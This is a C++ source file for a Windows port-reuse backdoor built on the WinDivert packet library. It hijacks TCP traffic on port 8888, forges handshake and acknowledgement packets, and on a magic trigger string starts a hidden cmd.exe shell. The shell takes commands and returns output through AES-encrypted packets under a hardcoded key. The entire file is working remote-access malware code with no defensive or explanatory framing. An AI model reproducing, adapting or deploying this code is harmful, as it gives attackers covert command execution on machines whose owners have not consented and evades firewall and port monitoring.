#include "server.h"
#pragma comment(lib,"WinDivert.lib")

static uint8 key[16] = {
	0x0f,0x15,0x71,0xc9,
	0x47,0xd9,0xe8,0x59,
	0x0c,0xb7,0xad,0xd6,
	0xaf,0x7f,0x67,0x98
};

int main(int argc, char** argv)
{
	CServer port_reuse;
	port_reuse.start();
	return 0;
}

CServer::CServer()
{
	m_divert_handle = NULL;
	m_template_packet_len = 0;
	m_packet_template = NULL;
	m_addr_template = NULL; 
	aes_set_key(&m_aes_ctx, key, 128);
}
CServer::~CServer()
{

}

void CServer::start()
{
	if (!init_divert("tcp.SrcPort = 8888"))
	{
		return;
	}

	wait_for_connect();

	PVOID packet;
	UINT payload_len;
	PVOID payload_buf;

	packet = (UINT8*)malloc(WINDIVERT_MTU_MAX);
	if (packet == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}

	while (TRUE)
	{
		recv_data_packet(packet, &payload_len, &payload_buf);

		if (payload_len && payload_buf)
		{
			if (payload_len >= strlen(SHELL_START) && !memcmp(payload_buf, SHELL_START, strlen(SHELL_START)))
			{
				run_shell();
			}
		}
	}
}

void CServer::send_response_packet(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Ack = 1;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send connect reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send connect reponse packet " << send_len << " bytes successfully!" << endl;
}

void CServer::set_packet_template(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT payload_len;

	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		&payload_len, NULL, NULL);
	m_template_packet_len = recv_len - payload_len;
	m_packet_template = (UINT8*)malloc(m_template_packet_len);
	if (m_packet_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_packet_template, packet, m_template_packet_len);
	WinDivertHelperParsePacket(m_packet_template, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) - payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);
	tcp_header->Psh = 0;
	tcp_header->Ack = 0;
	tcp_header->Syn = 0;
	UINT32 original_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + payload_len;
	tcp_header->SeqNum = tcp_header->AckNum;
	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);

	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
}

void CServer::set_addr_template(WINDIVERT_ADDRESS addr)
{
	m_addr_template = (PWINDIVERT_ADDRESS)malloc(sizeof(WINDIVERT_ADDRESS));
	if (m_addr_template == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_addr_template, &addr, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->Outbound = 1;
}

void CServer::send_data_packet(const char* payload_buf)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT reponse_payload_len;
	PVOID reponse_payload_buf;
	UINT8* reponse_packet;
	UINT packet_len, send_len;
	char* encrypt_buf;

	reponse_payload_len = 16 * (strlen(payload_buf) / 16 + 1);
	encrypt_buf = (char*)malloc(reponse_payload_len);
	if (!encrypt_buf)
	{
		return;
	}
	memset(encrypt_buf, 0, reponse_payload_len);
	memcpy(encrypt_buf, payload_buf, strlen(payload_buf));
	encrypt_payload(encrypt_buf, reponse_payload_len);

	packet_len = m_template_packet_len + reponse_payload_len;
	// build response packet
	reponse_packet = (UINT8*)malloc(packet_len);
	if (!reponse_packet)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	ZeroMemory(reponse_packet, packet_len);
	memcpy(reponse_packet, m_packet_template, m_template_packet_len);

	WinDivertHelperParsePacket(reponse_packet, packet_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	// rebuild ip header
	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + reponse_payload_len;
	ip_header->Length = WinDivertHelperHtons(ip_length);

	tcp_header->Psh = 1;
	tcp_header->Ack = 1;
	// pack new payload in
	// cause template packet has no payload buf, we pos it manully. 
	reponse_payload_buf = (PVOID)((UINT)tcp_header + sizeof(WINDIVERT_TCPHDR));
	memcpy(reponse_payload_buf, encrypt_buf, reponse_payload_len);
	free(encrypt_buf);
	WinDivertHelperCalcChecksums(reponse_packet, packet_len, m_addr_template, 0);

	if (!WinDivertSend(m_divert_handle, reponse_packet, packet_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send data packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
	add_seq(reponse_payload_len);
}

BOOL CServer::init_divert(const char* filter)
{
	int priority = 0;
	cout << "[*] filter = \"" << filter << "\"" << endl;
	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, 0);
	if (m_divert_handle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_INVALID_PARAMETER)
		{
			cout << "[!] filter syntax error!" << endl;
			return FALSE;
		}
		cout << "[!] failed to open the WinDivert device (" << GetLastError() << ")!" << endl;
		return FALSE;
	}

	cout << "[*] divert open successfully." << endl;
	return TRUE;
}

void CServer::run_shell()
{
	init_shell();
	PVOID packet;
	UINT payload_len;
	PVOID payload_buf;

	packet = malloc(WINDIVERT_MTU_MAX);
	if (!packet)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}

	while (TRUE)
	{
		recv_data_packet(packet, &payload_len, &payload_buf);
		if (payload_len && payload_buf)
		{
			DWORD real_write = 0;
			if (!WriteFile(m_std_in_wr, (char*)payload_buf, payload_len, &real_write, NULL))
			{
				cout << "[!] write data:"<< (char*)payload_buf << " error!" << endl;
			}
		}
	}
}

void CServer::init_shell()
{
	cout << "[*] start shell mode" << endl;

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&m_std_out_rd, &m_std_out_wr, &sa, 0);
	SetHandleInformation(m_std_out_rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&m_std_in_rd, &m_std_in_wr, &sa, 0);
	SetHandleInformation(m_std_in_wr, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO start_info;
	TCHAR cmd_line[] = TEXT("cmd");
	ZeroMemory(&start_info, sizeof(STARTUPINFO));
	start_info.cb = sizeof(STARTUPINFO);
	start_info.hStdError = m_std_out_wr;
	start_info.hStdOutput = m_std_out_wr;
	start_info.hStdInput = m_std_in_rd;
	start_info.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,
		cmd_line,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&start_info,
		&m_proc_info);
	m_read_thread = (HANDLE)_beginthreadex(nullptr, 0, read_from_cmd, this, 0, &m_thread_id);
}

void CServer::exit_shell()
{
	TerminateProcess(m_proc_info.hProcess, 0);
	TerminateThread(m_read_thread, 0);
	CloseHandle(m_read_thread);
	CloseHandle(m_proc_info.hProcess);
	CloseHandle(m_proc_info.hThread);
	CloseHandle(m_std_in_rd);
	CloseHandle(m_std_in_wr);
	CloseHandle(m_std_out_rd);
	CloseHandle(m_std_out_wr);
	cout << "[*] exit shell mode" << endl;
}

void CServer::add_seq(UINT seq)
{
	PWINDIVERT_TCPHDR tcp_header;

	WinDivertHelperParsePacket(m_packet_template, m_template_packet_len, NULL, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	UINT32 add_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + seq;
	tcp_header->SeqNum = WinDivertHelperHtonl(add_seq);
}

void CServer::send_connect_reponse(PVOID packet, UINT recv_len)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL , NULL, NULL);

	swap(tcp_header->DstPort, tcp_header->SrcPort);
	swap(ip_header->DstAddr, ip_header->SrcAddr);
	tcp_header->Ack = 1;
	tcp_header->Syn = 1;
	tcp_header->AckNum = WinDivertHelperHtonl(WinDivertHelperNtohl(tcp_header->SeqNum) + 1);
	tcp_header->SeqNum = WinDivertHelperHtonl(100000);
	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
	UINT send_len = 0;
	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
	{
		cout << "[!] failed to send reponse packet (" << GetLastError() << ")!" << endl;
	}
	cout << "[*] send reponse packet " << send_len << " bytes successfully!" << endl;
}

unsigned __stdcall CServer::read_from_cmd(void* ptr)
{
	CServer* pThis = (CServer*)ptr;
	uint8_t buff[2048];

	DWORD read_size;
	while (true)
	{
		if (!ReadFile(pThis->m_std_out_rd, buff, 2047, &read_size, nullptr) || !read_size)
		{
			break;
		}
		buff[read_size] = 0;
		pThis->send_data_packet((const char*)buff);
	}

	_endthreadex(0);
	return 0;
}

void CServer::encrypt_payload(PVOID buf_data, UINT buf_len)
{
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_encrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void CServer::decrypt_payload(PVOID buf_data, UINT buf_len)
{
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_decrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void CServer::print_ip_info(PWINDIVERT_IPHDR ip_header)
{
	char dst_addr[16];
	char src_addr[16];
	if (WinDivertHelperFormatIPv4Address(ip_header->DstAddr, dst_addr, 16) &&
		WinDivertHelperFormatIPv4Address(ip_header->SrcAddr, src_addr, 16))
	{
		cout << "[*] dst addr:" << dst_addr << "; src addr:" << src_addr << endl;
	}
}

bool CServer::recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID *payload_buf)
{
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;
	UINT recv_len;
	if (!WinDivertRecv(m_divert_handle, packet_buf, WINDIVERT_MTU_MAX, &recv_len, NULL))
	{
		cout << "[!] failed to read packet (" << GetLastError() << ")!" << endl;
		return false;
	}
	if (!m_template_packet_len)
	{
		set_packet_template(packet_buf, recv_len);
	}
	WinDivertHelperParsePacket(packet_buf, recv_len, &ip_header, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, payload_buf,
		payload_len, NULL, NULL);
	if (ip_header)
	{
		print_ip_info(ip_header);
	}
	if (tcp_header)
	{
		cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
	}
	if (*payload_buf && *payload_len)
	{
		send_response_packet(packet_buf, recv_len);
		decrypt_payload(*payload_buf, *payload_len);
		*payload_len = strlen((char*)*payload_buf);
		cout << "[*] recv payload length: " << *payload_len << " bytes" << endl;
		cout << "[*] recv payload buffer: " << (char*)*payload_buf << endl;
	}
	return true;
}

void CServer::wait_for_connect()
{
	PVOID packet;
	UINT recv_len;
	WINDIVERT_ADDRESS addr;
	PWINDIVERT_TCPHDR tcp_header;
	PWINDIVERT_IPHDR ip_header;

	packet = malloc(WINDIVERT_MTU_MAX);
	if (packet == NULL)
	{
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	while (TRUE)
	{
		if (!WinDivertRecv(m_divert_handle, packet, WINDIVERT_MTU_MAX, &recv_len, &addr))
		{
			continue;
		}

		WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
			NULL, NULL, NULL, &tcp_header, NULL, NULL,
			NULL, NULL, NULL);
		if (ip_header)
		{
			print_ip_info(ip_header);
		}
		if (tcp_header)
		{
			cout << "[*] dst port:" << WinDivertHelperNtohs(tcp_header->DstPort) << "; src port:" << WinDivertHelperNtohs(tcp_header->SrcPort) << endl;
			if (tcp_header->Syn)
			{
				cout << "[*] syn packet recv!" << endl;
				set_addr_template(addr);
				send_connect_reponse(packet, recv_len);
				break;
			}
		}
	}
	free(packet);
}